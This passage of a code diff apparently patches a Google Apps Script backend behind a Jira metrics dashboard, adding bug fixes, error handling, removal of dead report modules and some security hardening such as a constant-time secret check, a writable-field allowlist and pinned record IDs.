@@ -415,7 +415,12 @@ function computeDailyBucket_(team, rows) {
       if (fcr && fcr !== 'N/A') {
         fcrEligible++;
         if (esc === 'N/A' && fcr === 'Yes') fcrNotEscalated++;
-        if (esc && esc !== 'N/A' && fcr === 'No') escalated++;
+        // isRealEscalation_ (not a bare non-N/A check) — 'CA'/'SE' mean "handled inside the
+        // team", same real-escalation definition buildResolvedIndex_/buildResolvedByAssigneeMonth_
+        // already use. Found via a full-codebase audit: this spot (and its twin below/above)
+        // counted any non-N/A value as an escalation, inflating escalated_count relative to the
+        // dashboard's actual Escalation Rate, which is built on the correct definition.
+        if (isRealEscalation_(esc) && fcr === 'No') escalated++;
       }
     }
 
@@ -448,8 +453,10 @@ function computeDailyBucket_(team, rows) {
     }
 
     // Ticket Wait Time (SE): average time spent in "For Peer Review" per completed review cycle.
-    // Same business rule as getPeerReviewWaitReport_ (PeerReviewApi.gs) — only cycles that exited
-    // to On Hold or For Checking count as a real completed wait; other exits (e.g. cancelled) are
+    // Same business rule as lib/lead-cycle-time.ts's sumPeerReviewMinutes (PeerReviewApi.gs, the
+    // GAS-side original this was ported from, was deleted as unreachable dead code) — only cycles
+    // that exited to On Hold or For Checking count as a real completed wait; other exits (e.g.
+    // cancelled) are
     // excluded so the two views of this data never disagree. Bucketed by the ticket's CREATED date
     // (like on-hold pickup above), not by when each cycle actually occurred — a ticket created in
     // an earlier period whose review cycle finishes now still counts against its creation date.
@@ -795,7 +802,12 @@ function computeAssigneeMonthlyBucket_(team, rows) {
       if (fcr && fcr !== 'N/A') {
         fcrEligible++;
         if (esc === 'N/A' && fcr === 'Yes') fcrNotEscalated++;
-        if (esc && esc !== 'N/A' && fcr === 'No') escalated++;
+        // isRealEscalation_ (not a bare non-N/A check) — 'CA'/'SE' mean "handled inside the
+        // team", same real-escalation definition buildResolvedIndex_/buildResolvedByAssigneeMonth_
+        // already use. Found via a full-codebase audit: this spot (and its twin below/above)
+        // counted any non-N/A value as an escalation, inflating escalated_count relative to the
+        // dashboard's actual Escalation Rate, which is built on the correct definition.
+        if (isRealEscalation_(esc) && fcr === 'No') escalated++;
       }
     }
 
@@ -1225,32 +1237,56 @@ function runInitialBackfill() {
       return; // do not reschedule — needs a human to check the Jira response before retrying
     }
 
-    for (const issue of page.issues) {
-      try {
-        processAndUpsertIssue_(team, issue);
-      } catch (issueErr) {
-        Logger.log(`processAndUpsertIssue_ failed for ${issue.key}: ${issueErr}`);
-        logSyncError_(team.team_key, issue.key, 'upsert', '', String(issueErr));
+    // Everything from here through the end of this team's iteration used to be unguarded —
+    // found via a full-codebase audit: if flushDirtyDates_/writeSyncStatus_/
+    // scheduleBackfillContinuation_/markTeamBackfillComplete_ threw (e.g. a transient Sheets
+    // "internal error" under load, which does happen in Apps Script), the whole execution died
+    // with no notifyFailure_ alert and — since the one-off trigger that fired THIS execution has
+    // already been consumed — no continuation scheduled either. SYNC_CHECKPOINT would keep
+    // showing IN_PROGRESS from the prior successful page, and the backfill would silently stop
+    // advancing until someone happened to check ticket counts. This mirrors the jiraSearchIssues_
+    // try/catch above: on any unexpected failure, alert AND reschedule, rather than strand it.
+    try {
+      for (const issue of page.issues) {
+        try {
+          processAndUpsertIssue_(team, issue);
+        } catch (issueErr) {
+          Logger.log(`processAndUpsertIssue_ failed for ${issue.key}: ${issueErr}`);
+          logSyncError_(team.team_key, issue.key, 'upsert', '', String(issueErr));
+        }
       }
+      flushDirtyDates_(team.team_key);
+
+      const ticketsSoFar = (Number(checkpoint.tickets_synced_last_run) || 0) + page.issues.length;
+
+      if (page.nextPageToken && page.issues.length > 0) {
+        writeSyncStatus_(team.jira_project_key, {
+          backfill_cursor: page.nextPageToken,
+          last_sync_status: 'IN_PROGRESS',
+          last_sync_run_at: nowIso_(),
+          tickets_synced_last_run: ticketsSoFar,
+        });
+        scheduleBackfillContinuation_();
+        return; // end this execution slice — the continuation trigger resumes it
+      }
+
+      markTeamBackfillComplete_(team.jira_project_key, ticketsSoFar);
+      // Falls through to the next team in this SAME execution if there's one —
+      // small teams (DE/DEV) can finish well within one 6-minute run.
+    } catch (continuationErr) {
+      Logger.log(`runInitialBackfill: post-page bookkeeping failed for ${team.jira_project_key}: ${continuationErr}`);
+      try {
+        notifyFailure_(`runInitialBackfill: post-page bookkeeping failed for ${team.jira_project_key}`, continuationErr);
+      } catch (alertErr) {
+        Logger.log(`notifyFailure_ itself failed: ${alertErr}`);
+      }
+      try {
+        scheduleBackfillContinuation_();
+      } catch (scheduleErr) {
+        Logger.log(`scheduleBackfillContinuation_ itself failed: ${scheduleErr}`);
+      }
+      return;
     }
-    flushDirtyDates_(team.team_key);
-
-    const ticketsSoFar = (Number(checkpoint.tickets_synced_last_run) || 0) + page.issues.length;
-
-    if (page.nextPageToken && page.issues.length > 0) {
-      writeSyncStatus_(team.jira_project_key, {
-        backfill_cursor: page.nextPageToken,
-        last_sync_status: 'IN_PROGRESS',
-        last_sync_run_at: nowIso_(),
-        tickets_synced_last_run: ticketsSoFar,
-      });
-      scheduleBackfillContinuation_();
-      return; // end this execution slice — the continuation trigger resumes it
-    }
-
-    markTeamBackfillComplete_(team.jira_project_key, ticketsSoFar);
-    // Falls through to the next team in this SAME execution if there's one —
-    // small teams (DE/DEV) can finish well within one 6-minute run.
   }
 
   deleteBackfillContinuationTrigger_();
@@ -2576,102 +2612,6 @@ function deleteStuckTicketCatchupTrigger_() {
 
 
 // ================================================================
-// BacklogAgingApi.gs
-// ================================================================
-
-/**
- * Backlog Aging drill-down — the per-ticket list sitting behind the Backlog Aging scorecard
- * (DBA/DevOps in particular, where the owner is the Assigned COD field).
- *
- * Recomputes from RAW_<team>_<year> rather than reading METRICS_DAILY: the scorecard number is a
- * rolled-up (issue_type, date) count, which has no per-ticket identity left to list. The overdue
- * test here is deliberately character-for-character the same one buildResolvedIndex_
- * (Aggregation.gs) applies when it builds `overdue_resolved_on_date` — a DATE comparison,
- * resolved calendar day strictly LATER than the due date — so the row count on this page
- * reconciles with the "N of M resolved overdue" on the card.
- *
- * Scans EVERY raw year tab, not just the ones the period spans: raw tabs are keyed by CREATED
- * year, so a ticket created in December and resolved in January lives in the previous year's
- * tab and getRawRowsForYears_ would silently miss it. Same reason buildResolvedIndex_ walks
- * listRawYears_ in full. sheetToObjectsCached_ keeps the repeated reads cheap.
- */
-function getBacklogAgingReport_(params) {
-  const { startDate, endDate } = resolvePeriodToDateRange_(params.range, params.period, params.start, params.end);
-  const teams = params.team === 'ALL'
-    ? getActiveTeamsConfig_()
-    : getTeamsConfig_().filter((t) => t.team_key === params.team);
-
-  if (!teams.length) throw new Error(`Unknown team: ${params.team}`);
-
-  const issueType = params.issueType || '';
-  const tickets = [];
-  let resolvedInPeriod = 0;
-
-  teams.forEach((team) => {
-    getAllRawRowsForTeam_(team.team_key).forEach((r) => {
-      if (!r.resolved_datetime) return;
-      if (issueType && r.issue_type !== issueType) return;
-
-      const resolvedIso = toDisplayDate_(r.resolved_datetime);
-      if (!resolvedIso || resolvedIso < startDate || resolvedIso > endDate) return;
-      // Denominator of the rate — every ticket resolved in the period, overdue or not.
-      resolvedInPeriod++;
-
-      const dueIso = toDisplayDate_(r.due_date);
-      if (!dueIso || resolvedIso <= dueIso) return;
-
-      tickets.push({
-        teamKey: team.team_key,
-        issueKey: r.issue_key,
-        issueType: r.issue_type || '',
-        assignee: backlogAgingAssignee_(team, r) || '(unassigned)',
-        dueDate: dueIso,
-        resolvedDate: resolvedIso,
-        daysOverdue: isoDateDiffDays_(dueIso, resolvedIso),
-      });
-    });
-  });
-
-  tickets.sort((a, b) => (b.daysOverdue - a.daysOverdue) || String(a.issueKey).localeCompare(String(b.issueKey)));
-
-  return {
-    team: params.team,
-    range: params.range,
-    period: params.period,
-    issueType: issueType || null,
-    // Mixed ownership across an ALL rollup — only a single-team report can name the field.
-    assigneeLabel: teams.length === 1 ? backlogAgingAssigneeLabel_(teams[0]) : 'Assignee',
-    overdueCount: tickets.length,
-    resolvedInPeriod: resolvedInPeriod,
-    backlogAgingRate: resolvedInPeriod ? round4_(tickets.length / resolvedInPeriod) : null,
-    tickets: tickets,
-  };
-}
-
-/** The team's configured owner column — same switch Aggregation.gs uses for per-assignee rollups. */
-function backlogAgingAssignee_(team, row) {
-  return team.assignee_field_id === 'customfield_10189' ? row.assigned_se : row.assigned_cod;
-}
-
-function backlogAgingAssigneeLabel_(team) {
-  return team.assignee_field_id === 'customfield_10189' ? 'Assigned SE' : 'Assigned COD';
-}
-
-/**
- * Whole-day difference between two 'yyyy-MM-dd' strings. Anchored to UTC midnight on both sides
- * so the arithmetic can't be skewed by a DST-style offset shift between the two dates.
- */
-function isoDateDiffDays_(fromIso, toIso) {
-  return Math.round((isoDateToUtcMs_(toIso) - isoDateToUtcMs_(fromIso)) / 86400000);
-}
-
-function isoDateToUtcMs_(iso) {
-  const parts = String(iso).split('-').map(Number);
-  return Date.UTC(parts[0], parts[1] - 1, parts[2]);
-}
-
-
-// ================================================================
 // Code.gs
 // ================================================================
 
@@ -2694,12 +2634,30 @@ function doPost(e) {
   return handleRequest_(e, 'POST');
 }
 
+/**
+ * Hashes both sides before comparing, so a timing difference can't leak how many of the raw
+ * secret's leading bytes an attacker's guess matched — a plain `!==` short-circuits on the first
+ * mismatched character, which is exactly what a timing side-channel attack measures. This is the
+ * one gate the whole GAS backend relies on (found via a full-codebase security audit), so it gets
+ * the constant-time treatment even though Apps Script's own network jitter already makes the
+ * attack impractical in practice — defense-in-depth, not a response to a live exploit.
+ */
+function timingSafeEqual_(a, b) {
+  const digestA = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, String(a));
+  const digestB = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, String(b));
+  let diff = 0;
+  for (let i = 0; i < digestA.length; i++) {
+    diff |= digestA[i] ^ digestB[i];
+  }
+  return diff === 0;
+}
+
 function handleRequest_(e, method) {
   try {
     assertConfigured_();
     const params = (e && e.parameter) || {};
 
-    if (params.apiKey !== getScriptProperty_('API_SHARED_SECRET')) {
+    if (!timingSafeEqual_(params.apiKey, getScriptProperty_('API_SHARED_SECRET'))) {
       return jsonResponse_({ ok: false, error: 'Unauthorized' });
     }
 
@@ -2772,9 +2730,11 @@ function handleRequest_(e, method) {
       // 'backlog-aging-report', 'lead-cycle-time-report', 'late-pickup-report',
       // 'peer-review-wait-report', and 'tool-assisted-cycle-time' were removed here — Phase 4
       // moved every one of those reads to query Supabase directly (src/lib/*.ts), so nothing in
-      // the Next.js app calls them anymore. Their implementations still exist (MetricsApi.gs,
-      // BacklogAgingApi.gs, LeadCycleTimeApi.gs, LatePickupApi.gs, PeerReviewApi.gs,
-      // ToolAssistedApi.gs) — left in place, unreachable, rather than deleted outright.
+      // the Next.js app calls them anymore. MetricsApi.gs is still live (Insights.gs calls it for
+      // AI narrative generation); the other five implementations (BacklogAgingApi.gs,
+      // LeadCycleTimeApi.gs, LatePickupApi.gs, PeerReviewApi.gs, ToolAssistedApi.gs) were verified
+      // fully unreachable end-to-end via a full-codebase audit and deleted outright rather than
+      // left as dead weight.
 
       default:
         return jsonResponse_({ ok: false, error: `Unknown route: ${route}` });
@@ -5261,7 +5221,22 @@ function jiraSearchIssues_(jql, pageToken, maxResults, fields) {
  * Retrying is safe: the only call sets a field to a fixed value, so a replayed request lands on the
  * same state. Jira returns 204 with no body, so a successful call is simply one that doesn't throw.
  */
+/**
+ * The only field this integration is allowed to write. A closed list rather than trusting every
+ * caller to only ever pass the right thing — this function imposed no restriction of its own
+ * before (found via a full-codebase security audit), so a future caller passing through
+ * client-supplied field data would have silently gained the ability to overwrite ANY Jira field
+ * on ANY issue. Today there is exactly one caller (IncidentsApi.removeTicket, clearing Report
+ * Tagging) and exactly one field it's allowed to touch; extend this list deliberately if that
+ * ever changes, don't just widen the caller.
+ */
+const JIRA_WRITABLE_FIELDS_ = ['customfield_10262'];
+
 function jiraUpdateIssueFields_(issueKey, fields) {
+  const disallowed = Object.keys(fields).filter((f) => JIRA_WRITABLE_FIELDS_.indexOf(f) === -1);
+  if (disallowed.length) {
+    throw new Error(`jiraUpdateIssueFields_: field(s) not in the writable allowlist: ${disallowed.join(', ')}`);
+  }
   const base = getScriptProperty_('JIRA_BASE_URL');
   jiraFetchWithRetry_(`${base}/rest/api/3/issue/${encodeURIComponent(issueKey)}`, {
     method: 'put',
@@ -6183,219 +6158,6 @@ function logSyncError_(teamKey, issueKey, field, rawValue, message) {
 
 
 // ================================================================
-// LatePickupApi.gs
-// ================================================================
-
-/**
- * Late-pickup / 2-day-SLA monitoring for Account Creation tickets (ST team, SE-owned).
- * Reads RAW_ST_<year> directly rather than a precomputed METRICS_* table — Account
- * Creation is a modest subset of ST's volume, sheetToObjectsCached_ already makes a raw
- * read cheap, and the drill-down-to-ticket requirement rules out a rolled-up aggregation
- * table anyway (period buckets would lose per-ticket identity).
- *
- * Day-1 ownership rule (Manila time): created before 11:00 AM on a business day -> Day 1
- * is that same day. Created at/after 11:00 AM, or on a weekend -> Day 1 is the next
- * business day. "Picked up" = first_out_of_backlog_todo (already synced for every ticket
- * via extractCycleTimeStart_ in JiraSync.gs — no new sync work needed for this report).
- * 2-day SLA deadline = end of Day 2 (the next business day after Day 1).
- *
- * Tickets with no pickup timestamp yet are never historically bucketed by period — their
- * lateness would otherwise silently change every time the page is re-viewed. They only ever
- * appear in the always-live `atRisk` list (independent of the requested period) once Day 1 has
- * already passed — bounded to a recent lookback window (ATRISK_LOOKBACK_DAYS), not scanned across
- * every year of ST history: a 2-day-SLA "not yet picked up" ticket is inherently a near-term
- * concern, so there's no reason to re-read years of raw rows on every page load to find it.
- */
-const ATRISK_LOOKBACK_DAYS = 30;
-
-function getLatePickupReport_(params) {
-  const { startDate, endDate } = resolvePeriodToDateRange_(params.range, params.period, params.start, params.end);
-  const now = new Date();
-
-  const periodRows = getRawRowsForYears_('ST', startDate, endDate).filter((r) => {
-    if (r.issue_type !== 'Account Creation' || !r.created) return false;
-    const createdDate = toIsoDate_(new Date(r.created));
-    return createdDate >= startDate && createdDate <= endDate;
-  });
-
-  const bySe = {};
-  const tickets = [];
-
-  periodRows.forEach((r) => {
-    const created = new Date(r.created);
-    const pickedUpAt = r.first_out_of_backlog_todo ? new Date(r.first_out_of_backlog_todo) : null;
-    if (!pickedUpAt) return;
-
-    const day1Date = computeDay1Date_(created);
-    const day1End = endOfManilaDay_(day1Date);
-    const day2End = endOfManilaDay_(nextBusinessDay_(day1Date));
-
-    const seName = r.assigned_se || '(unassigned)';
-    const isLate = pickedUpAt > day1End;
-    const isOverdue = r.resolved_datetime ? new Date(r.resolved_datetime) > day2End : now > day2End;
-
-    tickets.push({
-      issueKey: r.issue_key,
-      seName: seName,
-      created: r.created,
-      day1End: day1End.toISOString(),
-      day2End: day2End.toISOString(),
-      pickedUpAt: pickedUpAt.toISOString(),
-      isLate: isLate,
-      isOverdue: isOverdue,
-      resolvedDatetime: r.resolved_datetime || null,
-    });
-
-    if (isLate) {
-      if (!bySe[seName]) bySe[seName] = { seName: seName, lateCount: 0, lateAndOverdueCount: 0 };
-      bySe[seName].lateCount++;
-      if (isOverdue) bySe[seName].lateAndOverdueCount++;
-    }
-  });
-
-  const atRiskWindowStart = toIsoDate_(new Date(now.getTime() - ATRISK_LOOKBACK_DAYS * 24 * 60 * 60 * 1000));
-  const atRisk = getRawRowsForYears_('ST', atRiskWindowStart, toIsoDate_(now))
-    .filter((r) => {
-      if (r.issue_type !== 'Account Creation' || !r.created || r.first_out_of_backlog_todo) return false;
-      return toIsoDate_(new Date(r.created)) >= atRiskWindowStart;
-    })
-    .map((r) => {
-      const day1End = endOfManilaDay_(computeDay1Date_(new Date(r.created)));
-      return { issueKey: r.issue_key, seName: r.assigned_se || '(unassigned)', created: r.created, day1End: day1End };
-    })
-    .filter((t) => now > t.day1End)
-    .map((t) => ({ issueKey: t.issueKey, seName: t.seName, created: t.created, day1End: t.day1End.toISOString() }));
-
-  return {
-    team: 'ST',
-    range: params.range,
-    period: params.period,
-    issueType: 'Account Creation',
-    bySe: Object.keys(bySe).map((k) => bySe[k]).sort((a, b) => b.lateCount - a.lateCount),
-    tickets: tickets,
-    atRisk: atRisk,
-  };
-}
-
-/** Manila calendar date a ticket becomes "Day 1 owned" per the 11 AM / weekend rule. */
-function computeDay1Date_(created) {
-  const dateOnly = manilaDateOnly_(created);
-  return (manilaHour_(created) < 11 && !isWeekend_(created)) ? dateOnly : nextBusinessDay_(dateOnly);
-}
-
-
-// ================================================================
-// LeadCycleTimeApi.gs
-// ================================================================
-
-/**
- * Lead Time / Cycle Time deep-dive — the drill-down behind those two scorecards for DE/DEV
- * (teams without peer-review tracking, where Cycle Time = first_out_of_backlog_todo -> resolved
- * and Lead Time = created -> resolved, both using the changelog-derived resolved_datetime — see
- * JiraSync.gs). One shared function for both metrics (`params.metric` = 'lead' | 'cycle') since
- * the breakdown shape is identical either way — only which two timestamps get diffed differs.
- *
- * Scans EVERY raw year tab, not just the ones the period spans — same reason BacklogAgingApi.gs
- * does: raw tabs are keyed by CREATED year, so a ticket created in December and resolved in
- * January would be missed by a created-year-bounded scan. sheetToObjectsCached_ keeps repeated
- * reads cheap.
- */
-function getLeadCycleTimeDrilldownReport_(params) {
-  const metric = params.metric === 'cycle' ? 'cycle' : 'lead';
-  const { startDate, endDate } = resolvePeriodToDateRange_(params.range, params.period, params.start, params.end);
-  const team = getTeamsConfig_().find((t) => t.team_key === params.team);
-  if (!team) throw new Error(`Unknown team: ${params.team}`);
-  const issueType = params.issueType || '';
-
-  const durationMinutesFor = function (r) {
-    if (!r.resolved_datetime) return null;
-    if (metric === 'cycle') {
-      if (!r.first_out_of_backlog_todo) return null;
-      return minutesBetween_(new Date(r.first_out_of_backlog_todo), new Date(r.resolved_datetime));
-    }
-    if (!r.created) return null;
-    return minutesBetween_(new Date(r.created), new Date(r.resolved_datetime));
-  };
-
-  const withDuration = getAllRawRowsForTeam_(team.team_key)
-    .filter((r) => {
-      if (issueType && r.issue_type !== issueType) return false;
-      if (!r.resolved_datetime) return false;
-      const resolvedIso = toDisplayDate_(r.resolved_datetime);
-      return resolvedIso && resolvedIso >= startDate && resolvedIso <= endDate;
-    })
-    .map((r) => ({ row: r, minutes: durationMinutesFor(r) }))
-    .filter((x) => x.minutes !== null && isFinite(x.minutes));
-
-  const topTickets = withDuration
-    .slice()
-    .sort((a, b) => b.minutes - a.minutes)
-    .slice(0, 10)
-    .map((x) => ({
-      issueKey: x.row.issue_key,
-      issueType: x.row.issue_type || '',
-      assignee: backlogAgingAssignee_(team, x.row) || '(unassigned)',
-      product: x.row.product || '(none)',
-      labels: x.row.labels || '',
-      minutes: round2_(x.minutes),
-      createdAt: x.row.created,
-      startedAt: x.row.first_out_of_backlog_todo || '',
-      resolvedAt: x.row.resolved_datetime,
-    }));
-
-  function rankBy(keyFn) {
-    const buckets = {};
-    withDuration.forEach((x) => {
-      const key = keyFn(x.row);
-      if (!key) return;
-      if (!buckets[key]) buckets[key] = { key: key, sum: 0, count: 0 };
-      buckets[key].sum += x.minutes;
-      buckets[key].count++;
-    });
-    return Object.keys(buckets)
-      .map((k) => ({ key: k, avgMinutes: round2_(buckets[k].sum / buckets[k].count), count: buckets[k].count }))
-      .sort((a, b) => b.avgMinutes - a.avgMinutes);
-  }
-
-  const byAssignee = rankBy(function (r) { return backlogAgingAssignee_(team, r) || '(unassigned)'; });
-  const byProduct = rankBy(function (r) { return r.product || '(none)'; });
-
-  // Labels: a ticket's labels are a CSV of tags — expand to individual tokens and attribute this
-  // ticket's duration to each one, excluding department/team tags like se-ops, hr-ops, payroll-ops
-  // (anything containing "-ops") since those aren't a meaningful task classification here.
-  const labelBuckets = {};
-  withDuration.forEach((x) => {
-    String(x.row.labels || '').split(',').map((s) => s.trim()).filter(Boolean).forEach((label) => {
-      if (label.toLowerCase().indexOf('-ops') !== -1) return;
-      if (!labelBuckets[label]) labelBuckets[label] = { key: label, sum: 0, count: 0 };
-      labelBuckets[label].sum += x.minutes;
-      labelBuckets[label].count++;
-    });
-  });
-  const byLabel = Object.keys(labelBuckets)
-    .map((k) => ({ key: k, avgMinutes: round2_(labelBuckets[k].sum / labelBuckets[k].count), count: labelBuckets[k].count }))
-    .sort((a, b) => b.avgMinutes - a.avgMinutes);
-
-  return {
-    team: team.team_key,
-    range: params.range,
-    period: params.period,
-    metric: metric,
-    issueType: issueType || null,
-    assigneeLabel: backlogAgingAssigneeLabel_(team),
-    count: withDuration.length,
-    avgMinutes: withDuration.length
-      ? round2_(withDuration.reduce(function (sum, x) { return sum + x.minutes; }, 0) / withDuration.length)
-      : null,
-    topTickets: topTickets,
-    byAssignee: byAssignee,
-    byProduct: byProduct,
-    byLabel: byLabel,
-  };
-}
-
-
-// ================================================================
 // LeaveApi.gs
 // ================================================================
 
@@ -6440,7 +6202,10 @@ var LeaveApi = {
       const rows = sheetToObjects_(sheet);
       const existing = rows.find((r) => r.leave_id === id);
       if (!existing) throw new Error(`Leave record not found: ${id}`);
-      const record = Object.assign({}, existing, payload, { updated_at: nowIso_() });
+      // leave_id pinned to the existing value AFTER payload, not before — payload has no field
+      // whitelist (found via a full-codebase audit), so without this a client could pass its own
+      // leave_id and silently reassign this row's identity, orphaning it from future lookups.
+      const record = Object.assign({}, existing, payload, { leave_id: existing.leave_id, updated_at: nowIso_() });
       updateSheetRow_(sheet, existing._row, record);
       return stripRowMeta_(record);
     });
@@ -6850,103 +6615,6 @@ function monthsInRange_(startDate, endDate) {
 
 
 // ================================================================
-// PeerReviewApi.gs
-// ================================================================
-
-/**
- * "For Peer Review" wait-time monitoring (ST team). Reads peer_review_cycles_json off
- * RAW_ST_<year> rows (populated at sync time by extractPeerReviewCyclesWithReviewer_ in
- * JiraSync.gs) and rolls completed cycles up by reviewer for the requested period.
- * Cycles are bucketed by when they STARTED (enteredAt), not the ticket's creation date,
- * since a review can start well after the ticket itself was created.
- *
- * Attribution is `reviewerAtEntry` ONLY, never `reviewer`, with no fallback — kept in step with
- * src/lib/peer-review.ts (the live path) and with the Incident Logs validator
- * (buildIncidentValidatorIndex_ in IncidentsApi.gs). See the long note on
- * extractPeerReviewCyclesWithReviewer_ in JiraSync.gs for why the two snapshots differ; in short
- * `reviewer` is the assignee at cycle CLOSE, usually whoever took the ticket at the next stage.
- * A row synced before that field existed reports '(unassigned)' rather than silently naming the
- * wrong person — run runStPeerReviewRebackfill (Backfill.gs) to re-derive the history.
- */
-function getPeerReviewWaitReport_(params) {
-  const { startDate, endDate } = resolvePeriodToDateRange_(params.range, params.period, params.start, params.end);
-  const rows = getRawRowsForYears_('ST', startDate, endDate);
-
-  const byReviewer = {};
-  const cycles = [];
-  const inReview = [];
-
-  rows.forEach((r) => {
-    if (!r.peer_review_cycles_json) return;
-    let parsedCycles;
-    try {
-      parsedCycles = JSON.parse(r.peer_review_cycles_json);
-    } catch (e) {
-      return;
-    }
-
-    parsedCycles.forEach((c) => {
-      if (!c.enteredAt) return;
-      const enteredDate = toIsoDate_(new Date(c.enteredAt));
-      if (enteredDate < startDate || enteredDate > endDate) return;
-
-      if (!c.exitedAt) {
-        inReview.push({ issueKey: r.issue_key, reviewer: c.reviewerAtEntry || '', enteredAt: c.enteredAt });
-        return;
-      }
-
-      // Business rule only cares about exits to On Hold / For Checking — cycles that exit
-      // some other way (e.g. cancelled) are still recorded by the extractor but excluded here
-      // rather than dropped at extraction time, so no data is silently lost upstream.
-      const exitedToStatus = (c.exitedToStatus || '').toLowerCase();
-      if (exitedToStatus !== 'on hold' && exitedToStatus !== 'for checking') return;
-
-      const waitMinutes = round2_((new Date(c.exitedAt) - new Date(c.enteredAt)) / 60000);
-      const reviewer = c.reviewerAtEntry || '(unassigned)';
-
-      cycles.push({
-        issueKey: r.issue_key,
-        reviewer: reviewer,
-        enteredAt: c.enteredAt,
-        exitedAt: c.exitedAt,
-        exitedToStatus: c.exitedToStatus,
-        waitMinutes: waitMinutes,
-      });
-
-      if (!byReviewer[reviewer]) {
-        byReviewer[reviewer] = { reviewerName: reviewer, cycleCount: 0, sumWaitMinutes: 0, maxWaitMinutes: 0 };
-      }
-      const b = byReviewer[reviewer];
-      b.cycleCount++;
-      b.sumWaitMinutes += waitMinutes;
-      b.maxWaitMinutes = Math.max(b.maxWaitMinutes, waitMinutes);
-    });
-  });
-
-  const byReviewerList = Object.keys(byReviewer)
-    .map((k) => {
-      const b = byReviewer[k];
-      return {
-        reviewerName: b.reviewerName,
-        cycleCount: b.cycleCount,
-        avgWaitMinutes: round2_(b.sumWaitMinutes / b.cycleCount),
-        maxWaitMinutes: b.maxWaitMinutes,
-      };
-    })
-    .sort((a, b) => b.avgWaitMinutes - a.avgWaitMinutes);
-
-  return {
-    team: 'ST',
-    range: params.range,
-    period: params.period,
-    byReviewer: byReviewerList,
-    cycles: cycles,
-    inReview: inReview,
-  };
-}
-
-
-// ================================================================
 // ProgressApi.gs
 // ================================================================
 
@@ -6995,7 +6663,10 @@ var ProgressApi = {
       const rows = sheetToObjects_(sheet);
       const existing = rows.find((r) => r.progress_id === id);
       if (!existing) throw new Error(`Progress row not found: ${id}`);
-      const record = Object.assign({}, existing, payload, { updated_at: nowIso_() });
+      // progress_id pinned to the existing value AFTER payload, not before — payload has no field
+      // whitelist (found via a full-codebase audit), so without this a client could pass its own
+      // progress_id and silently reassign this row's identity, orphaning it from future lookups.
+      const record = Object.assign({}, existing, payload, { progress_id: existing.progress_id, updated_at: nowIso_() });
       if (payload.items_processed !== undefined) record.items_processed = Number(payload.items_processed) || 0;
       updateSheetRow_(sheet, existing._row, record);
       const o = stripRowMeta_(record);
@@ -7061,7 +6732,10 @@ var ProjectsApi = {
       const rows = sheetToObjects_(sheet);
       const existing = rows.find((r) => r.project_id === id);
       if (!existing) throw new Error(`Project not found: ${id}`);
-      const record = Object.assign({}, existing, payload, { updated_at: nowIso_() });
+      // project_id pinned to the existing value AFTER payload, not before — payload has no field
+      // whitelist (found via a full-codebase audit), so without this a client could pass its own
+      // project_id and silently reassign this row's identity, orphaning it from future lookups.
+      const record = Object.assign({}, existing, payload, { project_id: existing.project_id, updated_at: nowIso_() });
       updateSheetRow_(sheet, existing._row, record);
       return stripRowMeta_(record);
     });
@@ -7149,7 +6823,10 @@ var RtoApi = {
       const rows = sheetToObjects_(sheet);
       const existing = rows.find((r) => r.rto_id === id);
       if (!existing) throw new Error(`RTO record not found: ${id}`);
-      const record = Object.assign({}, existing, payload, { updated_at: nowIso_() });
+      // rto_id pinned to the existing value AFTER payload, not before — payload has no field
+      // whitelist (found via a full-codebase audit), so without this a client could pass its own
+      // rto_id and silently reassign this row's identity, orphaning it from future lookups.
+      const record = Object.assign({}, existing, payload, { rto_id: existing.rto_id, updated_at: nowIso_() });
       updateSheetRow_(sheet, existing._row, record);
       return stripRowMeta_(record);
     });
@@ -8856,7 +8533,10 @@ var TasksApi = {
       const rows = sheetToObjects_(sheet);
       const existing = rows.find((r) => r.task_id === id);
       if (!existing) throw new Error(`Task not found: ${id}`);
-      const record = Object.assign({}, existing, payload, { updated_at: nowIso_() });
+      // task_id pinned to the existing value AFTER payload, not before — payload has no field
+      // whitelist (found via a full-codebase audit), so without this a client could pass its own
+      // task_id and silently reassign this row's identity, orphaning it from future lookups.
+      const record = Object.assign({}, existing, payload, { task_id: existing.task_id, updated_at: nowIso_() });
       if (payload.done !== undefined) record.done = payload.done === true || payload.done === 'true';
       updateSheetRow_(sheet, existing._row, record);
       const o = stripRowMeta_(record);
@@ -8934,78 +8614,6 @@ var TicketProjectApi = {
     });
   },
 };
-
-
-// ================================================================
-// ToolAssistedApi.gs
-// ================================================================
-
-/**
- * "Tool-assisted" cycle-time comparison (SE/ST) — measures whether the tools recently introduced
- * to SEs have actually shortened backend execution time. Cycle time here = the span from when a
- * ticket first moved OUT of Backlog/To Do (`first_out_of_backlog_todo`) to when it entered For
- * Peer Review (`cycle_time_end`, already computed by extractReviewCycleTimeRange_ in JiraSync.gs)
- * — both already-synced fields, no new changelog extraction needed for this report.
- *
- * Restricted to issue types whose review path actually ends at For Peer Review
- * (cycleTimeEndStatusForIssueType_ in JiraSync.gs) — Investigations (Data Generation, External
- * Support Request, Investigation, Team Viewer) end at For Checking/For Product Team instead, so
- * `cycle_time_end` wouldn't mean the same thing for those.
- *
- * Splits tickets CREATED in the period into "tool-assisted" (Jira label match, case-insensitive,
- * defaults to 'tool-assisted') vs every other in-scope ticket, so the two averages are directly
- * comparable — the whole point of the report is seeing whether the tool-assisted group is faster.
- */
-function getToolAssistedCycleTimeReport_(params) {
-  const label = String(params.label || 'tool-assisted').trim().toLowerCase();
-  const { startDate, endDate } = resolvePeriodToDateRange_(params.range, params.period, params.start, params.end);
-
-  const rows = getRawRowsForYears_('ST', startDate, endDate).filter((r) => {
-    if (!r.created) return false;
-    const createdDate = toIsoDate_(new Date(r.created));
-    if (createdDate < startDate || createdDate > endDate) return false;
-    return cycleTimeEndStatusForIssueType_(r.issue_type) === 'for peer review';
-  });
-
-  const withCycleTime = rows
-    .filter((r) => r.first_out_of_backlog_todo && r.cycle_time_end)
-    .map((r) => {
-      const labelList = String(r.labels || '').toLowerCase().split(',').map((s) => s.trim()).filter(Boolean);
-      return {
-        issueKey: r.issue_key,
-        issueType: r.issue_type,
-        assignee: r.assigned_se || '(unassigned)',
-        labels: r.labels || '',
-        hasLabel: labelList.indexOf(label) !== -1,
-        created: r.created,
-        todoExitAt: r.first_out_of_backlog_todo,
-        peerReviewAt: r.cycle_time_end,
-        cycleTimeMinutes: round2_(minutesBetween_(new Date(r.first_out_of_backlog_todo), new Date(r.cycle_time_end))),
-      };
-    });
-
